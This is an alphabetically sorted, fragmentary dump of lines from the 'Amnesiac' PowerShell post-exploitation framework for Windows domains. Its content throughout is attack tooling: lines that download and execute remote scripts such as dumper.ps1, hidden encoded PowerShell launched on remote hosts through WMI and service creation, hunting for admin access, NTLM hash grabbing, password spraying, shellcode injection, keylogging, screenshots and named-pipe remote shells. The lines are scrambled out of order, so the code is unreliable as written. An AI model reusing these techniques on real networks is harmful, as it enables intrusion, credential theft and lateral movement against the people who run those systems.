"elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = "" [-] No Admin Access [SMB]""}"
"elseif($userCommand -ne """"){"
"else{$ServerScript="""
"else{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace ""root"
"else{$global:Message = "" [-] No Admin Access [SMB]"""
"else{$global:Message = "" [-] No Admin Access [WMI]"""
"else{$global:Message = "" [-] No Bookmarks set.""}"
"else{$global:Message = "" [-] No Sessions established.""}"
"else{$global:Message = "" [-] No User-Defined Targets. Scope: All"""
"else{$global:MultiPipeName = ""$GlobalPipeName""}"
"else{$global:ServerURL = ""https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools""}"
"else{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" "
"else{$userdefPath = ""c:"
"else{$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Filter ""$KeyID = '$GuidOutput'""}"
"else{([wmiclass]"""
"else{Write-Output """"}"
"else{Write-Output ""[-] No Access""}"
"exit"""
"exit""}"
"function UpdateBookmark($identifier, $newIndex) {"
"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1')"")"
"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Tkn_Access_Check.ps1')"")"
"iex(new-object net.webclient).downloadstring('$($global:ServerURL)/dumper.ps1')"""
"if ($UserName -AND $Password -AND ($Method -eq ""WMI"")) {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}"
"if ($choice -like ""RepoURL"
"if ($choice -like ""Serve"
"if ($commandParts -icontains ""-Domain"") {"
"if ($commandParts -icontains ""-DomainController"") {"
"if ($commandParts -icontains ""-Password"") {"
"if ($commandParts -icontains ""-Targets"") {"
"if ($commandParts -icontains ""-UserName"") {"
"if ($line -eq """
"if ($line -eq ""$PN"") {"
"if ($line -eq ""$SyncString"") {"
"if ($userCommand -eq ""exit"") {"
"if ($wmiDataOutput.CommandStatus -eq ""Completed"") {"
"if (($UserName -OR $Password) -AND ($Method -eq ""SMB"")) {"
"if(!$Path){$Path = ""c:"
"if(!$ScanMode){$global:Message = "" ["
"if($Command -eq ""AV""){"
"if($Isx64){Write-Output ""["
"if($Method -eq ""WMI""){$PortScan = 135}"
"if($UserName -AND $Password){$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace ""root"
"if($command -like ""Kerb"" -OR $command -like ""Invoke-PassSpray"
"if($command -like ""Migrate "
"if($cred){$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Credential $cred -Filter ""$KeyID = '$GuidOutput'""}"
"if($global:Detach){$ServerScript="""
"if($global:Detach){$finalstring = ""powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript""}"
"if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = "" ["
"if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = "" [-] No Admin Access [PSRemoting]""}"
"if($isAdmin){Write-Output """""
"if($line -like """
"if($serverOutput -like """
"n$"", """""
"nFile-Server -Port $userdefPort -Path $userdefPath"""
"param ($computer, $Port)"
"param ($computer, $port)"
"param ($sr, $sw)"
"param($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript)"
"param($Computer, $Command, $WmiScript)"
"param($Port, $Path)"
"param($url, $destinationFolder)"
"param($url, $destinationPath)"
"system"""
"system) unless you specify credentials (WMI only)"""
"throw ""Failed to run command on $ComputerName."""
"throw ""Failed to start process on $ComputerName. Return value: $($startProcess.ReturnValue)"""
"u{000A}"""" "
"u{000A}"""""
"} catch {Write-Output ""[-] Access Denied"""
"} catch {Write-Output ""[-] Error retrieving History for user $userDir""}"
"} catch {Write-Output ""[-] Error retrieving screenshot""}"
"} else {$global:Message = "" [-] No Targets Defined""}"
"} else {Write-Output """"}"
"} elseif ($whoamiInfo -eq """") {"
$' }
$') {
$(Get-Location)
$([System.Net.Dns]::GetHostByName((
$AdminSessionObject 
$AdminSessionObject = foreach ($session in $global:directAdminSessions) {
$AllDomains 
$AllDomains = $AllDomains 
$AllDomains = $ReachableDomains
$AllDomains = @($ParentDomain)
$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
$Banner = @('
$BannerLink = '                                           [Version: 1.0.4] https://github.com/Leo4j/Amnesiac'
$BookmarksObject 
$BookmarksObject = $global:bookmarks 
$ChildContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
$ChildDomains = @($ChildContext 
$ClientScriptEdit = $ClientScript 
$ClipboardContent 
$Command = $commandParts[2]
$Computer
$ComputerAccess
$ComputerAccess 
$ComputerAccess = $ComputerAccess 
$ComputerAccess = $ComputerAccess.Trim()
$ComputerAccess = ($ComputerAccess 
$ComputerAccess = @()
$ComputerName
$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
$ComputerName create $ServiceName binpath= 
$Computers 
$Computers = $Computers 
$Computers = $Targets
$Computers = $global:AllUserDefinedTargets
$Computers = $reachable_hosts
$Computers = @()
$Computers = Get-Content -Path $Targets
$ConstructFileName 
$ConstructFileName = $TempUsernameGrab 
$Error.Clear()
$ExitLoop = $False
$FileServerScript = @'
$FinalTargets = $global:AllOurTargets
$Find
$Find -split [Environment]::NewLine 
$Find = @()
$Find = Access_Check -Method PSRemoting
$Find = Access_Check -Method PSRemoting -Domain $userdefdomain
$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc
$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets
$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets
$Find = Access_Check -Method PSRemoting -Targets $userdeftargets
$Find = Find-LocalAdminAccess -Method PSRemoting
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword
$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword
$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets
$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword
$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword
$FindCurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$GuidOutput = ($wmiData 
$HashGrab = Invoke-GrabTheHash 
$HashGrab){
$HashGrab}else{Write-Output '[-] HashGrab Failure'}}else{Write-Output '[-] Please move to a writable directory'}
$Host.UI.RawUI.FlushInputBuffer()}
$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
$InjectHex = $commandParts[2]
$InjectOutput 
$InjectOutput = $InjectOutput 
$InjectOutput = $InjectOutput.Trim()
$InjectOutput = ($InjectOutput 
$InjectPID = $commandParts[1]
$Isx64 = [System.Environment]::Is64BitProcess
$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($WmiScript)
$Job.PowerShell.Dispose()
$Job.RunspacePool = $RunspacePool
$JobObjects 
$JobObjects = @()
$KeylogContent 
$LocalAdminAccessOutput = $LocalAdminAccessOutput 
$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
$LocalAdminAccessOutput = $null
$LocalAdminAccessOutput = ($LocalAdminAccessOutput 
$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method PSRemoting -Command $finalstring -NoOutput
$LocalAdminAccessOutput = Find-LocalAdminAccess -Targets $LocalAdminAccessTargets -Method SMB -Command $finalstring -NoOutput
$Method = $commandParts[0]
$MultiSessionObject 
$MultiSessionObject = foreach ($multilistener in $global:MultipleSessions) {
$Mutex.Dispose()
$Mutex.ReleaseMutex()
$OldGlobalPipeName = $global:MultiPipeName
$OutboundTrusts = @(foreach($AllDomain in $AllDomains){FindDomainTrusts -Domain $AllDomain 
$PN = $PipeName
$PN = $global:MultiPipeName
$ParentDomain = ($FindCurrentDomain 
$Password
$PipeName = $global:MultiPipeName
$PipeName = $randomvalue
$PlaceHolderDomains = $AllDomains
$PossibleIPAddresses = Get-NetIPAddress -AddressFamily IPv4 
$PwshRawClientScript = $RawClientScript
$PwshRawServerScript = $RawServerScript
$RawClientScript = $RawClientScript.Replace('2>
$RawServerScript = $RawServerScript.Replace('2>
$ReachableDomains = $AllDomains
$ReachableResult = $null
$ReachableResult = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
$Result = $Job.PowerShell.EndInvoke($Job.Handle)
$RunCmd = {
$RunspacePool.Close()
$RunspacePool.Open()
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
$ScriptBlock = {
$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force
$SecPassword)
$ServerScriptEdit = $ServerScript 
$ShCodePlaceholder = 
$ShCodePlaceholder = ShellGen -ShCommand $finalstring
$ShCodePlaceholder.Trim()
$ShowBookmarks = $True
$ShowMenuCommands = $False
$ShowSessions = $True
$ShowUserDefinedTargets = $False
$ShowUserDefinedTargets = $False}
$SingleSessionObject 
$SingleSessionObject = foreach ($listener in $global:listenerSessions) {
$SmbScript = @'
$Target = $commandParts[1]
$Target create $ServiceName binpath= 
$TargetServer delete 
$TempAccessVar = $TempAccessVar 
$TempAdminAccessTargets = $LocalAdminAccessOutput 
$TempAdminAccessTargets = $serverOutput 
$TempAdminAccessTargets = WMIAdminAccess -Targets $allReachTargets -Command $finalstring
$TempHostname = $HostFQDN -replace '
$TempNet
$TempNet 
$TempUsernameGrab 
$TempUsernameGrab = $TempUsernameGrab 
$TempUsernameGrab = $TempUsernameGrab.Trim()
$TempUsernameGrab = ($TempUsernameGrab 
$TestPath = Test-Path $Targets
$TestPath = Test-Path $commandParts[1]
$TrustTargetNames = $TrustTargetNames 
$TrustTargetNames = @(foreach($AllDomain in $AllDomains){(FindDomainTrusts -Domain $AllDomain).TargetName})
$UserDefinedTargets = $UserDefinedTargets 
$UserDefinedTargets = $global:AllUserDefinedTargets
$UserDefinedTargets = $null
$UserDefinedTargets = @()
$UserDefinedTargets = CheckReachableHosts
$UserDefinedTargets = Get-Content -Path $commandParts[1]
$UserIdentity = $initialInfo[2]
$UserPath 
$UserPath = $UserPath.Trim()
$WmiScript = @'
$_ -match 'NTLM hash'}
$_)}
$_)}}
$_.Exception.Message
$_.Exception.Message-split '
$_.Id -eq 
$_.Id -eq $parentProcessId }
$_.Pipe.Dispose()
$_.TrimEnd())}
$_.TrimEnd())}}catch{
$_.contains('.') }
$a.ClosE()
$aR)
$aR=New-Object System.IO.Pipes.PipeAccessRule(
$accessRule = New-Object System.IO.Pipes.PipeAccessRule(
$accessRule)
$adminLines = $LocalAdminAccessOutput 
$adminLines = $serverOutput 
$allowedCommands = @(
$ar)
$ar=New-Object System.IO.Pipes.PipeAccessRule(
$b.COpYTo(
$b.ClOse()
$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
$b64FileServerMonitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FileServerMonitoringScript))
$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
$b64psScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psScript))
$b=New-Object IO.Compression.GzipStream(
$base64String = [Convert]::ToBase64String($bytes)
$base64String'
$baseFileName = $TempUsernameGrab 
$baseFileName = $userDir 
$baseFileNameWithoutExtension = [System.IO.Path]::GetFileNameWithoutExtension($remotefileName)
$bookmark = [PSCustomObject]@{
$bookmarkIdentifier = $global:bookmarks[$j].Identifier
$bookmarkToRemove = $global:bookmarks 
$bytes = $memoryStream.ToArray()
$bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptWithCommand)
$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawClientScript)
$bytesToCompress = [System.Text.Encoding]::UTF8.GetBytes($PwshRawServerScript)
$c 2>
$c-eq
$c-eq 'exit'){break}
$c.ToArray())
$c.cLose()
$c=New-Object System.IO.MemoryStream
$choice = $choice.Trim()
$choice = $null
$choice = Read-Host
$cimSession 
$cimSession = New-CimSession -Credential $cred -ComputerName $ComputerName -SessionOption $sessionOptions
$cmd 2>
$cmd=
$command 
$command 2>
$command = 
$command = $command 
$command = $command.TrimEnd()
$command = Read-Host
$commandParts = $choice -split '
$commandParts = $command -split '
$commandParts[1] = $commandParts[1] -replace '
$commandStr 
$computerNameOnly = $initialInfo[0]
$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential 
$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > 
$computersLine = 
$computersLine =@()
$computersLine){
$connectionOptions = New-Object System.Management.ConnectionOptions
$connectionOptions.Password = $Password
$connectionOptions.Username = $UserName
$counter
$counter = 0
$createNewClass.Put() 
$cred > 
$currentPID = $PID
$currentUrl = $url
$d=[System.Text.Encoding]::UTF8.GETSTrIng(
$desiredIndex
$destinationFolder = $userdefPath
$destinationPath = Join-Path -Path $destinationFolder -ChildPath $fileName
$directAdminEndIndex = 4 
$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(
$dummyPipeClient)
$dummyPipeClient.Connect()
$e-split
$elapsedTime
$elapsedTime 
$elapsedTime = 0
$encCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rawCommand))
$encodedCommand = [Convert]::ToBase64String($bytes)
$env:USERNAME
$env:USERNAME)log.txt
$err=
$errorMessage = 
$errorMessage)
$fileContentBase64 
$fileContentBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($localFullPath))
$fileExtension = [System.IO.Path]::GetExtension($remotefileName)
$fileName = Get-FileNameFromUrl -url $url
$fileName = Join-Path -Path $directory -ChildPath $baseFileNameWithoutExtension$fileExtension
$fileName = Join-Path -Path $directory -ChildPath $remotefileName
$fileName = Join-Path -Path $directory -ChildPath ($baseFileName 
$filename = [System.IO.Path]::GetFileName($uri.LocalPath)
$filtered = $InjectOutput 
$finalResult = 
$gatherhostname 
$gatherhostname = $gatherhostname 
$gatherhostname = $gatherhostname.Trim()
$gatherhostname = ($gatherhostname 
$global:AdminCheckProtocol = 'SMB'
$global:AdminCheckProtocol = 'WMI'
$global:AllOurTargets = $TempAccessVar
$global:AllOurTargets = $reachable_hosts
$global:AllOurTargets = @()
$global:AllUserDefinedTargets = $TempAdminAccessTargets
$global:AllUserDefinedTargets = $UserDefinedTargets
$global:AllUserDefinedTargets = $gatherhostname
$global:AllUserDefinedTargets = $global:AllUserDefinedTargets 
$global:AllUserDefinedTargets = $null
$global:AllUserDefinedTargets = @()
$global:AllUserDefinedTargets = Get-Content -Path $Targets
$global:IP = $null
$global:Message 
$global:Message = $global:Message 
$global:Message = $null
$global:MultiPipeName = $commandParts[1]
$global:MultiPipeName = $global:OldPipeNameToRestore
$global:MultiPipeName = ((65..90) 
$global:MultipleSessions = New-Object 'System.Collections.Generic.List[psobject]'
$global:MultipleSessions = [System.Collections.Generic.List[psobject]]$global:MultipleSessions
$global:MultipleSessions = [System.Collections.Generic.List[psobject]]($global:MultipleSessions 
$global:MultipleSessions.Clear()
$global:MultipleSessions.RemoveAt($indexToRemove)
$global:OldPipeNameToRestore = $global:MultiPipeName
$global:OldTargetsToRestore = $global:AllUserDefinedTargets
$global:RestoreAllUserDefinedTargets = $False}
$global:RestoreAllUserDefinedTargets = $True
$global:RestoreOldMultiPipeName = $False}
$global:RestoreOldMultiPipeName = $True
$global:RestoreTimeout = $False
$global:RestoreTimeout = $True
$global:ScanModer = $False
$global:ScanModer = $False}
$global:ScanModer = $True
$global:ServerURL = $userdefURL
$global:UserDefinedTargetsPath = $commandParts[1]
$global:UserDefinedTargetsPath = $null
$global:bookmarks = New-Object 'System.Collections.Generic.List[psobject]'
$global:bookmarks = [System.Collections.Generic.List[psobject]]($global:bookmarks 
$global:bookmarks.Add($bookmark)
$global:bookmarks.Remove($bookmarkToRemove) > $null
$global:bookmarks.RemoveAt($indexToRemove)
$global:bookmarks.RemoveAt($j)
$global:directAdminSessions 
$global:directAdminSessions = @()
$global:listenerSessions = New-Object 'System.Collections.Generic.List[psobject]'
$global:listenerSessions = [System.Collections.Generic.List[psobject]]($global:listenerSessions 
$global:listenerSessions.Add($session)
$global:listenerSessions.Clear()
$global:listenerSessions.RemoveAt($indexToRemove)
$global:localadminaccesspayload = 'PSRemoting'
$global:localadminaccesspayload = 'SMB'
$global:payloadformat = 'b64'
$global:payloadformat = 'exe'
$global:payloadformat = 'gzip'
$global:payloadformat = 'pwraw'
$global:payloadformat = 'pwsh'
$global:payloadformat = 'raw'
$globalListenerEndIndex = $listenerEndIndex 
$globalrandomvalue = ((65..90) 
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$gz))
$gz=
$gzipCompressor.Close()
$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
$gzipcompressedBytes = $memoryStream.ToArray()
$handle = $psCmd.BeginInvoke()
$historyFile = Join-Path -Path $fulluserpath -ChildPath 'AppData
$identifierToRemove = $selectedMultiSession.UniquePipeID
$identifierToRemove = $selectedSession.PipeName
$index
$indexToRemove = $i
$indexToRemove = $null
$indexToRemove = -1
$inputFromUser = Read-Host
$ipPattern = '
$job 
$job = Invoke-Command -ComputerName 
$line = $sr.ReadLine()
$listenerEndIndex = $directAdminEndIndex 
$listenerIndex
$listenerIndex = 0
$listenerMatch = $global:listenerSessions 
$memoryStream = New-Object System.IO.MemoryStream
$memoryStream = [System.IO.MemoryStream]::new()
$memoryStream.Close()
$multiListenerIndex
$multiListenerIndex = 0
$multiListenerMatch = $global:MultipleSessions 
$noAccessLines = $LocalAdminAccessOutput 
$noAccessLines = $serverOutput 
$null
$null = $runspaces.Add([PSCustomObject]@{
$null = [System.Console]::ReadKey($true)
$null)
$null}else{Write-Output '[-] No Access'}
$output 
$output = $psCmd.EndInvoke($handle)
$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
$output = Invoke-SMBRemoting -ComputerName $Computer -Command $Command
$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command
$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
$outputData
$outputData = 
$p.Close()
$p.Connect(600000)
$pS)
$pS.Disconnect()
$pS.IsConnected){break}
$parentProcessId = $PID
$pipeClient)
$pipeClient.Close()
$pipeClient.Connect($Timeout)
$pipeClient.Connect()
$pipeClient.Connect(600000)
$pipeClient.Dispose()
$pipeServer)
$pipeServer.Close()
$pipeServer.Disconnect()
$pipeServer.Dispose()
$pipeServer.IsConnected) {
$pipeServer.IsConnected) {break}
$pipeServer.WaitForConnection()
$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($Port)
$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($PortScan)
$powerShellInstance.RunspacePool = $runspacePool
$powershell = [powershell]::Create().AddScript({
$powershell.RunspacePool = $runspacePool
$predefinedCommands
$predefinedCommands = @(
$predefinedCommands = Get-Command -Command $command
$primaryScriptProcessId = $currentPID
$primaryScriptProcessId }
$process = Get-Process 
$process = Start-Process -FilePath 'C:
$process) {
$processId = 
$processId = $global:FileServerProcess.Id
$ps)
$ps.Disconnect()
$ps.Dispose()
$ps.IsConnected){break}
$ps.WaitForConnection()
$psCmd = [powershell]::Create().AddScript($scriptBlock).AddArgument($sr)
$psCmd = [powershell]::Create().AddScript($scriptBlock).AddArgument($sr).AddArgument($sw)
$psCmd.Runspace = $runspace
$pwd
$r-split
$r.ReadLine()
$r=New-Object System.IO.StreamReader(
$r=iex 
$randomvalue = ((65..90) 
$reachable_hosts
$reachable_hosts 
$reachable_hosts = $Computers
$reachable_hosts = $null
$reachable_hosts = $reachable_hosts 
$reachable_hosts = @()
$remoteFileName = [System.IO.Path]::GetFileName($localFullPath)
$remotePath 
$remotePath = $initialInfo[1]
$remotePath = $output
$remotePath = $remotePath.Trim()
$remotefileName
$remotefileName = $command.Split(' ')[1]
$result = $run.Pipe.EndInvoke($run.Status)
$result = $runspace.Instance.EndInvoke($runspace.Status)
$result = Invoke-Expression 
$result-split '
$resultData = $null
$resultData = $wmiDataOutput.OutputData
$rootDirectory = $Path  
$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer)
$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer).AddArgument($Method).AddArgument($UserName).AddArgument($Password)
$runspace = [runspacefactory]::CreateRunspace()
$runspace.Close()
$runspace.Open()
$runspace.Pipe.Dispose()
$runspace.Pipe.EndInvoke($runspace.Status)
$runspace.RunspacePool = $runspacePool
$runspacePool.Close()
$runspacePool.Dispose()
$runspacePool.Open()
$runspaces 
$runspaces = @()
$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
$runspaces = New-Object System.Collections.ArrayList
$runspaces.Add([PSCustomObject]@{
$sD)
$sD.AddAccessRule(
$sD=New-Object System.IO.Pipes.PipeSecurity
$scope.Connect()
$scriptBlock = {
$scriptWithCommand = $FileServerScript 
$sd)
$sd.AddAccessRule(
$sd=New-Object System.IO.Pipes.PipeSecurity
$securityDescriptor = New-Object System.IO.Pipes.PipeSecurity
$securityDescriptor)
$securityDescriptor.AddAccessRule(
$securityDescriptor.AddAccessRule($accessRule)
$selectedIndex = $choice - 5
$selectedIndex = $choice - 5 - $global:directAdminSessions.Count
$selectedIndex = $choice - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
$selectedIndex = $sessionNumber - 5
$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count
$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
$selectedMultiSession  = $global:MultipleSessions[$selectedIndex]
$selectedMultiSession = $global:MultipleSessions[$i]
$selectedMultiSession = $global:MultipleSessions[$selectedIndex]
$selectedSession = $global:listenerSessions[$i]
$selectedSession = $global:listenerSessions[$selectedIndex]
$selectedTarget = $global:directAdminSessions[$selectedIndex]
$server.Start($rootDirectory)
$serverOutput 
$serverOutput = $serverOutput 
$serverOutput = $serverOutput.Trim()
$serverOutput = ($serverOutput 
$session = [PSCustomObject]@{
$sessionName = $listener.ComputerName
$sessionName = $multilistener.ComputerName
$sessionNumber = [int]$commandParts[1]
$sessionOptions = New-CimSessionOption -Protocol Dcom
$sessionuser = $listener.UserID
$sessionuser = $multilistener.UserID
$shellcode 
$shellcommand = $commandParts[1]
$sr = $StreamReader
$sr = New-Object System.IO.StreamReader(
$sr = New-Object System.IO.StreamReader($pipeClient)
$sr = New-Object System.IO.StreamReader($pipeServer)
$sr.Close()
$sr.ReadLine()
$sr=New-Object System.IO.StreamReader(
$state)
$state.Close()}
$stoparguments -WindowStyle Hidden
$subfolders 
$sw = $StreamWriter
$sw = New-Object System.IO.StreamWriter(
$sw = New-Object System.IO.StreamWriter($pipeClient)
$sw = New-Object System.IO.StreamWriter($pipeServer)
$sw.Close()
$sw.Flush()
$sw.Flush()}}
$sw.WriteLine(
$sw.WriteLine($command)
$sw.WriteLine($fullCommand)
$sw.WriteLine($oneLiner)
$sw.WriteLine('$([System.Net.Dns]::GetHostByName(($env:computerName)).HostName)')
$sw.WriteLine('$env:username')
$sw.WriteLine('$pwd 
$sw=New-Object System.IO.StreamWriter(
$tcb={param(
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Close()
$tcpClient.EndConnect($asyncResult)
$timeInterval = 1 
$timeout = 40
$timeout = 60
$timeoutSeconds = 300
$timeoutSeconds = 5
$tm = New-Object System.Threading.Timer(
$tm.Dispose()
$totalHeight = 1080
$totalHeight = 2160
$totalWidth = 1920
$totalWidth = 3840
$trimmedShCodePlaceholder = 
$true) {
$true){
$true){Start-Sleep -Milliseconds 100
$true){if(-not 
$uri = [System.Uri]$url
$urls = @(
$user=New-Object System.Security.Principal.SecurityIdentifier 
$userCommand = Read-Host
$userDirs = Get-ChildItem -Path $usersDirectory -Directory
$userDirs.Name')
$userdefPath = $commandParts[2]
$userdefPort = $commandParts[1]
$userdefURL = $commandParts[1]
$userdefURL = $userdefURL.TrimEnd('/')
$userdefdc = $commandParts[$index 
$userdefdomain = $commandParts[$index 
$userdefpassword = $commandParts[$index 
$userdeftargets = $commandParts[$index 
$userdefusername = $commandParts[$index 
$w.Flush()
$w.Flush()}
$w.WriteLine(
$w.WriteLine('
$w=New-Object System.IO.StreamWriter(
$wait = $asyncResult.AsyncWaitHandle.WaitOne(100)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
$whoamiInfo = $line.Trim()
$whoamiInfo = $whoamiInfo.Trim()
$wmiData.Dispose()
$wmiData.GetType() 
$wmiDataOutput = $null
$wmiDataOutput.Dispose()
$wmiDataOutput.Put() 
' -and 
'$TempNet = netstat -anp tcp
'$gzipcompressedBase64
'$isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
') {
'0' {
'1' {
'2' {
'3' {
'4' {
'Add-Type -AssemblyName System.Windows.Forms
'ComputerName' = $computerNameOnly
'DisplayComputerName' = $global:MultipleSessions[$selectedIndex].ComputerName
'DisplayComputerName' = $global:directAdminSessions[$selectedIndex]
'DisplayComputerName' = $global:listenerSessions[$selectedIndex].ComputerName
'DisplayUserID' = $global:MultipleSessions[$selectedIndex].UserID
'DisplayUserID' = $global:listenerSessions[$selectedIndex].UserID
'Get-WmiObject Win32_Service 
'Identifier'  = $global:MultipleSessions[$selectedIndex].UniquePipeID
'Identifier'  = $global:listenerSessions[$selectedIndex].PipeName
'Identifier'  = $null  
'PipeName' = $PipeName
'PipeServer' = $pipeServer
'RemotePath'   = $remotePath
'SHost' = $_.DisplayComputerName
'SHost' = $session
'SHost' = $sessionName
'SUser' = $null
'SX' = $_.DisplayName.TrimEnd()
'StreamReader' = $sr
'StreamWriter' = $sw
'UniquePipeID' = ((65..90) 
'UserID'   = $UserIdentity
'UserID' = $whoamiInfo
'WMIC /Namespace:
'[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
'quser
'wevtutil el 
){del 'tmpfile'
. ([ScriptBlock]::Create($SmbScript))
. ([ScriptBlock]::Create($WmiScript))
.(1[6-9]
.DESCRIPTION
.SYNOPSIS
0x18]
0x1c]
0x20]
0x24]
0x3c]
0x60]
2[0-9]
3[0-1])
:   
:       :
:    :
:   :
= $ChildDomain
= $TrustAttributesMapping[$key]
= $TrustTargetName
= $line
= $result
= $result.Computer
= $target
= $timeInterval
= 0x51
= 0xac              
= 0xc3              
= 0xfc              
= 0xff
= @{
= Command $ShCommand
= Encode-Command $chunk
= Get-ADComputers -ADCompDomain $AllDomain
= [PSCustomObject]@{
@{OutputData = 
Add-Type -AssemblyName System.Core
Administrator
Amn3siacP@ssw0rd!
Amnesiac
Amnesiac Author: Rob LP (@L3o4j)
AppData
Clear-Host
Computer = $Computer
ComputerName = $Computer
ConsoleHost_history.txt'
Display-SessionMenu
Documents
Documents 
Download-File -url $url -destinationPath $destinationPath
Empty Registry
Error        = $_.Exception.Message
Exclusions
Failed to write
Find-LocalAdminAccess Author: Rob LP (@L3o4j)
ForEach-Object{
Get-AvailableCommands
Get-Process 
Get-Process -IncludeUserName 
Get-Service 
Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue
Handle     = $Job.BeginInvoke()
IEX > 
Instance = $powerShellInstance
